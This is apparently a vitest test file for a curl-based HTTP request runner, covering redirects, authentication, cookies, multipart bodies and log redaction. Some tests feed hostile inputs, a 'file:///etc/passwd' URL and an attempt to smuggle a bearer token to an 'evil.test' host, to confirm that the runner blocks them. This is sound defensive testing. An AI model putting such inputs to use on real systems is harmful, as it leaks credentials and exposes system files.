import { chmodSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { createServer, type IncomingMessage, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { gzipSync } from 'node:zlib'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { emptyRequest, type HttpRequestSpec } from '@shared/httpRequest'
import { HttpRequests, parseHeaderDump, redactTimeline, runHttpRequest, type HttpEnvironment } from './httpRunner'

let server: Server
let base = ''
let curlHome = ''

function readAll(req: IncomingMessage): Promise<string> {
  return new Promise((resolve) => {
    let data = ''
    req.on('data', (c: Buffer) => (data += c.toString('utf8')))
    req.on('end', () => resolve(data))
  })
}

beforeAll(async () => {
  server = createServer((req, res) => {
    void (async () => {
      const body = await readAll(req)
      if (req.url === '/redirect') {
        res.writeHead(302, { Location: '/echo?from=redirect' })
        res.end()
      } else if (req.url === '/redirect-away') {
        // localhost is another origin than the environment's 127.0.0.1
        res.writeHead(307, { Location: `http://localhost:${(server.address() as AddressInfo).port}/echo?away=1` })
        res.end()
      } else if (req.url === '/binary') {
        res.writeHead(200, { 'Content-Type': 'application/octet-stream' })
        res.end(Buffer.from([0, 1, 2, 3, 0, 255]))
      } else if (req.url === '/gzip') {
        res.writeHead(200, { 'Content-Type': 'text/plain', 'Content-Encoding': 'gzip' })
        res.end(gzipSync('compressed hello'))
      } else if (req.url === '/image') {
        res.writeHead(200, { 'Content-Type': 'image/png' })
        res.end(Buffer.from([137, 80, 78, 71, 0, 1]))
      } else if (req.url === '/login') {
        res.writeHead(200, { 'Set-Cookie': 'sid=abc; Path=/; HttpOnly' })
        res.end('ok')
      } else if (req.url === '/slow') {
        setTimeout(() => res.end('late'), 5000)
      } else {
        res.writeHead(201, 'Created Fine', { 'Content-Type': 'application/json', 'X-Server': 'test' })
        res.end(JSON.stringify({ method: req.method, url: req.url, headers: req.headers, body }))
      }
    })()
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}/api`
  curlHome = mkdtempSync(join(tmpdir(), 'runner-curlhome-'))
  writeFileSync(join(curlHome, '.curlrc'), 'header = "X-Env: from-curlrc"\n')
})

afterAll(() => {
  server.close()
  rmSync(curlHome, { recursive: true, force: true })
})

const env = (patch: Partial<HttpEnvironment> = {}): HttpEnvironment => ({
  env: { CURL_HOME: curlHome, BASE_URL: base },
  baseUrl: base,
  token: 'tok-123',
  defaultHeaderNames: ['X-Env'],
  ...patch
})
const spec = (patch: Partial<HttpRequestSpec>): HttpRequestSpec => ({ ...emptyRequest(), ...patch })
const echo = (body: string): { method: string; url: string; headers: Record<string, string>; body: string } => JSON.parse(body)

describe('runHttpRequest', () => {
  it('sends method, path, environment headers, $TOKEN headers and a JSON body', async () => {
    const res = await runHttpRequest(
      spec({ method: 'POST', url: '/echo?x=1', headers: 'Authorization: Bearer $TOKEN', body: '{"name":"Ann"}' }),
      env()
    )
    expect(res.error).toBeUndefined()
    expect(res.status).toBe(201)
    expect(res.statusText).toBe('Created Fine')
    expect(res.contentType).toBe('application/json')
    expect(res.headers).toContainEqual({ name: 'X-Server', value: 'test' })
    const got = echo(res.body)
    expect(got.method).toBe('POST')
    expect(got.url).toBe('/api/echo?x=1')
    expect(got.body).toBe('{"name":"Ann"}')
    expect(got.headers['x-env']).toBe('from-curlrc')
    expect(got.headers.authorization).toBe('Bearer tok-123')
    expect(got.headers['content-type']).toBe('application/json')
    expect(res.timeMs).toBeGreaterThanOrEqual(0)
    expect(res.bodyBytes).toBe(Buffer.byteLength(res.body))
  })

  it('follows redirects only when asked', async () => {
    const stay = await runHttpRequest(spec({ url: `http://127.0.0.1:${new URL(base).port}/redirect` }), env())
    expect(stay.status).toBe(302)
    const follow = await runHttpRequest(spec({ url: `http://127.0.0.1:${new URL(base).port}/redirect`, followRedirects: true }), env())
    expect(follow.status).toBe(201)
    expect(follow.redirects).toBe(1)
    expect(echo(follow.body).url).toBe('/echo?from=redirect')
  })

  it('reports binary bodies without text and decompresses gzip', async () => {
    const origin = `http://127.0.0.1:${new URL(base).port}`
    const bin = await runHttpRequest(spec({ url: `${origin}/binary` }), env())
    expect(bin.binary).toBe(true)
    expect(bin.body).toBe('')
    expect(bin.bodyBytes).toBe(6)
    const gz = await runHttpRequest(spec({ url: `${origin}/gzip` }), env())
    expect(gz.body).toBe('compressed hello')
  })

  it('sends HEAD without reading a body', async () => {
    const res = await runHttpRequest(spec({ method: 'HEAD', url: '/echo' }), env())
    expect(res.status).toBe(201)
    expect(res.body).toBe('')
  })

  it('returns curl errors instead of throwing when no response arrives', async () => {
    const res = await runHttpRequest(spec({ url: 'http://127.0.0.1:1/' }), env())
    expect(res.status).toBe(0)
    expect(res.error).toMatch(/connect|refused/i)
  })

  it('refuses non-http URLs and $TOKEN headers without a token', async () => {
    await expect(runHttpRequest(spec({ url: 'file:///etc/passwd' }), env())).rejects.toThrow(/http/)
    await expect(runHttpRequest(spec({ url: '/x', headers: 'Authorization: Bearer $TOKEN' }), env({ token: undefined }))).rejects.toThrow(
      /no token/
    )
    await expect(runHttpRequest(spec({ url: '/x', headers: 'bad header' }), env())).rejects.toThrow(/Invalid header/)
  })
})

describe('runHttpRequest across hosts', () => {
  const port = (): string => new URL(base).port

  it('keeps the environment headers home: other hosts get only what the form says', async () => {
    const res = await runHttpRequest(spec({ url: `http://localhost:${port()}/echo`, headers: 'X-Plain: 1' }), env())
    const got = echo(res.body)
    expect(got.headers['x-env']).toBeUndefined()
    expect(got.headers['x-plain']).toBe('1')
  })

  it('drops credentials and environment headers when a redirect leaves the host', async () => {
    const res = await runHttpRequest(
      spec({ url: `http://127.0.0.1:${port()}/redirect-away`, headers: 'Authorization: Bearer $TOKEN\nCookie: a=1\nX-Plain: 1', followRedirects: true }),
      env()
    )
    const got = echo(res.body)
    expect(res.redirects).toBe(1)
    expect(got.url).toBe('/echo?away=1')
    expect(got.headers.authorization).toBeUndefined()
    expect(got.headers.cookie).toBeUndefined()
    expect(got.headers['x-env']).toBeUndefined()
    expect(got.headers['x-plain']).toBe('1')
  })

  it('turns POST into GET after a 302, like browsers', async () => {
    const res = await runHttpRequest(spec({ method: 'POST', url: `http://127.0.0.1:${port()}/redirect`, body: '{"a":1}', followRedirects: true }), env())
    const got = echo(res.body)
    expect(got.method).toBe('GET')
    expect(got.body).toBe('')
    expect(got.headers['content-type']).toBeUndefined()
  })
})

describe('runHttpRequest like the tab shell', () => {
  it('sends brackets and braces in query strings literally (no curl globbing)', async () => {
    const res = await runHttpRequest(spec({ url: '/echo?filter[status]=a&q={x}' }), env())
    expect(res.error).toBeUndefined()
    expect(decodeURIComponent(echo(res.body).url)).toBe('/api/echo?filter[status]=a&q={x}')
  })

  it('expands $TOKEN in the URL and $BASE_URL in headers, as the terminal would', async () => {
    const res = await runHttpRequest(spec({ url: '/echo?k=$TOKEN', headers: 'X-Origin: $BASE_URL' }), env())
    const got = echo(res.body)
    expect(got.url).toBe('/api/echo?k=tok-123')
    expect(got.headers['x-origin']).toBe(base)
  })

  it('never puts the token on the curl command line', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'fake-curl-'))
    const argsFile = join(dir, 'args')
    const fake = join(dir, 'curl')
    writeFileSync(fake, `#!/bin/sh\nprintf '%s\\n' "$@" > '${argsFile}'\nexit 7\n`)
    chmodSync(fake, 0o755)
    try {
      const res = await runHttpRequest(spec({ url: '/x?k=$TOKEN', headers: 'Authorization: Bearer $TOKEN' }), env(), { curl: fake })
      expect(res.status).toBe(0)
      const args = readFileSync(argsFile, 'utf8')
      expect(args).not.toContain('tok-123')
      expect(args).toMatch(/^-H$/m)
      expect(args).toMatch(/^@.*request-headers$/m)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})

describe('HttpRequests', () => {
  it('cancels the running request of a tab', async () => {
    const requests = new HttpRequests(() => env())
    const pending = requests.send('tab', spec({ url: `http://127.0.0.1:${new URL(base).port}/slow` }))
    setTimeout(() => requests.cancel('tab'), 200)
    await expect(pending).rejects.toThrow(/cancelled/)
  })

  it('needs an open environment', async () => {
    await expect(new HttpRequests(() => undefined).send('tab', spec({}))).rejects.toThrow(/reconnect/)
  })
})

describe('parseHeaderDump', () => {
  it('keeps the final response after redirects and 100 Continue', () => {
    const dump = 'HTTP/1.1 100 Continue\r\n\r\nHTTP/1.1 301 Moved\r\nLocation: /b\r\n\r\nHTTP/2 200 \r\ncontent-type: text/plain\r\n\r\n'
    expect(parseHeaderDump(dump)).toEqual({
      httpVersion: '2',
      status: 200,
      statusText: '',
      headers: [{ name: 'content-type', value: 'text/plain' }]
    })
    expect(parseHeaderDump('')).toBeNull()
  })
})

describe('runHttpRequest with the structured form', () => {
  const origin = (): string => `http://127.0.0.1:${new URL(base).port}`

  it('sends auth settings, $TOKEN included, and never the secret on the command line', async () => {
    const bearer = echo((await runHttpRequest(spec({ url: '/echo', auth: { type: 'bearer', token: '$TOKEN' } }), env())).body)
    expect(bearer.headers.authorization).toBe('Bearer tok-123')
    const basic = echo((await runHttpRequest(spec({ url: '/echo', auth: { type: 'basic', username: 'ann', password: '$TOKEN' } }), env())).body)
    expect(basic.headers.authorization).toBe(`Basic ${Buffer.from('ann:tok-123').toString('base64')}`)
    const query = echo((await runHttpRequest(spec({ url: '/echo', auth: { type: 'apikey', name: 'key', value: '$TOKEN', in: 'query' } }), env())).body)
    expect(query.url).toBe('/api/echo?key=tok-123')
    const header = echo((await runHttpRequest(spec({ url: '/echo', auth: { type: 'apikey', name: 'X-Key', value: 'v', in: 'header' } }), env())).body)
    expect(header.headers['x-key']).toBe('v')
  })

  it('lets a request replace a default header of the environment instead of sending both', async () => {
    const got = echo((await runHttpRequest(spec({ url: '/echo', headers: 'X-Env: mine' }), env())).body)
    expect(got.headers['x-env']).toBe('mine')
  })

  it('drops an API key header when a redirect leaves the host', async () => {
    const res = await runHttpRequest(spec({ url: `${origin()}/redirect-away`, followRedirects: true, auth: { type: 'apikey', name: 'X-Key', value: 'v', in: 'header' } }), env())
    expect(echo(res.body).headers['x-key']).toBeUndefined()
  })

  it('sends urlencoded forms and GraphQL as their right content types', async () => {
    const form = echo((await runHttpRequest(spec({ method: 'POST', url: '/echo', bodyKind: 'form', form: [{ name: 'a b', value: 'c&d', enabled: true }] }), env())).body)
    expect(form.body).toBe('a%20b=c%26d')
    expect(form.headers['content-type']).toBe('application/x-www-form-urlencoded')
    const gql = echo((await runHttpRequest(spec({ method: 'POST', url: '/echo', bodyKind: 'graphql', body: '{ me }', graphqlVariables: '{"a":1}' }), env())).body)
    expect(JSON.parse(gql.body)).toEqual({ query: '{ me }', variables: { a: 1 } })
    await expect(runHttpRequest(spec({ method: 'POST', url: '/echo', bodyKind: 'graphql', body: 'q', graphqlVariables: '{' }), env())).rejects.toThrow('GraphQL')
  })

  it('sends multipart text and files, and a value starting with @ stays text', async () => {
    const file = join(curlHome, 'up load.txt')
    writeFileSync(file, 'file-content')
    const res = await runHttpRequest(
      spec({
        method: 'POST',
        url: '/echo',
        bodyKind: 'multipart',
        form: [
          { name: 'note', value: `@${file}`, enabled: true },
          { name: 'doc', value: file, enabled: true, file: true }
        ]
      }),
      env()
    )
    const got = echo(res.body)
    expect(res.error).toBeUndefined()
    expect(got.headers['content-type']).toMatch(/^multipart\/form-data; boundary=/)
    expect(got.body).toContain(`@${file}`)
    expect(got.body).toContain('file-content')
    await expect(runHttpRequest(spec({ method: 'POST', url: '/echo', bodyKind: 'multipart', form: [{ name: 'f', value: 'rel/path', enabled: true, file: true }] }), env())).rejects.toThrow('again')
  })

  it('sends a file as the whole body', async () => {
    const file = join(curlHome, 'raw.bin')
    writeFileSync(file, 'raw-bytes')
    const got = echo((await runHttpRequest(spec({ method: 'PUT', url: '/echo', bodyKind: 'file', filePath: file }), env())).body)
    expect(got.body).toBe('raw-bytes')
    expect(got.headers['content-type']).toBe('application/octet-stream')
  })

  it('reports timing, the address and a timeline without credentials', async () => {
    const res = await runHttpRequest(spec({ url: '/echo', headers: 'Authorization: Bearer $TOKEN\nX-Plain: visible' }), env())
    expect(res.timing).toMatchObject({ tls: 0 })
    expect(res.remoteIp).toBe('127.0.0.1')
    expect(res.timeline).toContain('> X-Plain: visible')
    expect(res.timeline).toContain('> Authorization: ••••')
    expect(res.timeline).toContain('< HTTP/1.1 201')
    expect(res.timeline).not.toContain('tok-123')
  })

  it('still reports curl errors in verbose mode', async () => {
    const res = await runHttpRequest(spec({ url: 'http://127.0.0.1:1/' }), env())
    expect(res.status).toBe(0)
    expect(res.error).toMatch(/connect|refused/i)
    expect(res.error).not.toMatch(/^\*/)
  })

  it('returns images for the preview, and honours the timeout of the request', async () => {
    const img = await runHttpRequest(spec({ url: `${origin()}/image` }), env())
    expect(img.bodyBase64).toBe(Buffer.from([137, 80, 78, 71, 0, 1]).toString('base64'))
    const slow = await runHttpRequest(spec({ url: `${origin()}/slow`, timeoutSec: 1 }), env())
    expect(slow.error).toMatch(/timed out|timeout/i)
  })

  it('keeps cookies in the jar between requests of the same environment', async () => {
    const jar = join(curlHome, 'jar.txt')
    await runHttpRequest(spec({ url: `${origin()}/login` }), env(), { cookieJar: jar })
    const got = echo((await runHttpRequest(spec({ url: `${origin()}/echo` }), env(), { cookieJar: jar })).body)
    expect(got.headers.cookie).toBe('sid=abc')
    expect(readFileSync(jar, 'utf8')).toContain('sid')
  })
})

describe('the token stays with the environment', () => {
  const foreign = (): string => `http://localhost:${new URL(base).port}/echo`

  it('refuses to send it to another host from any field', async () => {
    await expect(runHttpRequest(spec({ url: foreign(), headers: 'Authorization: Bearer $TOKEN' }), env())).rejects.toThrow('sent only to')
    await expect(runHttpRequest(spec({ url: `${foreign()}?k=$TOKEN` }), env())).rejects.toThrow('sent only to')
    await expect(runHttpRequest(spec({ url: foreign(), auth: { type: 'bearer', token: '$TOKEN' } }), env())).rejects.toThrow('sent only to')
    await expect(runHttpRequest(spec({ url: foreign(), auth: { type: 'basic', username: 'a', password: '$TOKEN' } }), env())).rejects.toThrow('sent only to')
    await expect(runHttpRequest(spec({ url: foreign(), auth: { type: 'apikey', name: 'k', value: '$TOKEN', in: 'query' } }), env())).rejects.toThrow('sent only to')
  })

  it('cannot be smuggled out by a host built from $BASE_URL', async () => {
    const bare = env({ baseUrl: 'http://example.test' })
    await expect(runHttpRequest(spec({ url: '$BASE_URL.evil.test/x', headers: 'Authorization: Bearer $TOKEN' }), bare)).rejects.toThrow('sent only to')
  })

  it('does not come back to the interface in the URL, redirects or the timeline', async () => {
    const encoded = env({ token: 'a/b+c=' })
    const query = await runHttpRequest(spec({ url: '/echo', auth: { type: 'apikey', name: 'key', value: '$TOKEN', in: 'query' } }), encoded)
    expect(query.status).toBe(201)
    expect(echo(query.body).url).toBe(`/api/echo?key=${encodeURIComponent('a/b+c=')}`)
    expect(query.url).toContain('key=••••')
    expect(query.url).not.toContain('a%2Fb')
    expect(query.timeline).not.toContain('a%2Fb')
    const plain = await runHttpRequest(spec({ url: '/echo?k=$TOKEN' }), env())
    expect(plain.url).not.toContain('tok-123')
    expect(plain.timeline).not.toContain('tok-123')
  })
})

describe('redactTimeline', () => {
  it('masks credentials in curl\'s HTTP/2 lines too', () => {
    const log = ['* [HTTP/2] [1] [:method: GET]', '* [HTTP/2] [1] [authorization: Basic dXNlcjpzZWtyZXQ=]', '* [HTTP/2] [1] [x-key: abc]', '* [HTTP/2] [1] [accept: */*]'].join('\n')
    expect(redactTimeline(log, ['X-Key'], undefined).split('\n')).toEqual([
      '* [HTTP/2] [1] [:method: GET]',
      '* [HTTP/2] [1] [authorization: ••••]',
      '* [HTTP/2] [1] [x-key: ••••]',
      '* [HTTP/2] [1] [accept: */*]'
    ])
  })

  it('keeps the log lines, masks credentials and the token anywhere', () => {
    const log = ['* Connected', '> GET /?k=sekret HTTP/1.1', '> X-Key: value', '> Cookie: a=1', '> Accept: */*', '{ [5 bytes data]', '< HTTP/1.1 200 OK', 'curl: (0) noise'].join('\r\n')
    expect(redactTimeline(log, ['X-Key'], 'sekret').split('\n')).toEqual([
      '* Connected',
      '> GET /?k=•••• HTTP/1.1',
      '> X-Key: ••••',
      '> Cookie: ••••',
      '> Accept: */*',
      '< HTTP/1.1 200 OK'
    ])
  })
})

describe('HttpRequests: saving the response', () => {
  it('copies the whole last response, and forgets it with the tab', async () => {
    const requests = new HttpRequests(() => env())
    const target = join(curlHome, 'saved.bin')
    await expect(requests.saveResponse('tab', target)).rejects.toThrow('no response')
    await requests.send('tab', spec({ url: `http://127.0.0.1:${new URL(base).port}/binary` }))
    await requests.saveResponse('tab', target)
    expect([...readFileSync(target)]).toEqual([0, 1, 2, 3, 0, 255])
    requests.dispose('tab')
    await expect(requests.saveResponse('tab', target)).rejects.toThrow('no response')
  })

  it('uses the cookie jar of the environment, unless the request turns it off', async () => {
    const jarPath = join(curlHome, 'env-jar.txt')
    const origin = `http://127.0.0.1:${new URL(base).port}`
    const requests = new HttpRequests(
      () => env({ sessionId: 's1' }),
      () => jarPath
    )
    await requests.send('t', spec({ url: `${origin}/login` }))
    expect(echo((await requests.send('t', spec({ url: `${origin}/echo` }))).body).headers.cookie).toBe('sid=abc')
    expect(echo((await requests.send('t', spec({ url: `${origin}/echo`, saveCookies: false }))).body).headers.cookie).toBeUndefined()
    requests.cancelAll()
  })
})

